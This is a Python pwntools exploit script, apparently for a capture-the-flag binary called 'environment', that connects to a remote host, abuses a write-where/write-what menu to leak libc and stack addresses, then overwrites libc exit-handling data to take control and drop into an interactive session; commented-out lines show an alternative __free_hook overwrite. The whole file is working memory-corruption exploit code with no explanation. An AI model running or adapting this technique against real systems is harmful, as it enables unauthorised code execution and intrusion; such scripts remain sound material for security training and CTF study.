#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./environment')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or '178.62.113.165'
port = int(args.PORT or 30951)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x0000000000401099
b *0x0000000000401477
continue
'''.format(**locals())

# -- Exploit goes here --
libc = ELF("./libc.so.6")
io = start()
rec_count = 0x0000000000603080
for i in range(0x5):
    io.sendlineafter("> ", "2")
    io.sendlineafter("> ", "1")#write where
    io.sendlineafter("> ", "n")#write what
io.recvuntil("\x74\x3a\x20\x1b\x5b\x30\x6d\x5b")# junk
leak = int(io.recvuntil("]").strip(b"]"), 16)
print(hex(leak))
libc.address = leak - libc.sym['printf']
exit_func = libc.address + 0x3eb718
program_invocation_name = libc.address + 0x3ec500

print(hex(libc.address))
for i in range(0x5):
    io.sendlineafter("> ", "2")
    io.sendlineafter("> ", "1")#write where
    io.sendlineafter("> ", "n")#write what
io.sendlineafter("> ", str(libc.got['__environ']))
io.recvuntil("\x1b\x5b\x30\x6d")
leak = u64(io.recvuntil("\x0a").strip(b"\x0a").ljust(8, b'\x00'))
print(hex(leak))

initial = libc.address + 0x3ecd80
sus = libc.address + 0x22a000
rsi = libc.address + 0x3eb711
io.sendlineafter("> ", "1")
io.sendlineafter("> ", str(libc.address + 0x3eb048))
io.sendafter("> ", str(initial))
# io.sendlineafter("> ", "1")
# io.sendlineafter("> ", str(libc.sym['__free_hook']))
# io.sendlineafter("> ", str(libc.address + 0x4f3d5))
# pause()
# io.sendlineafter("> ", "1")
# io.sendlineafter("> ", str(initial))
# io.sendlineafter("> ", str(libc.address + 0x3ecd88))
io.interactive()

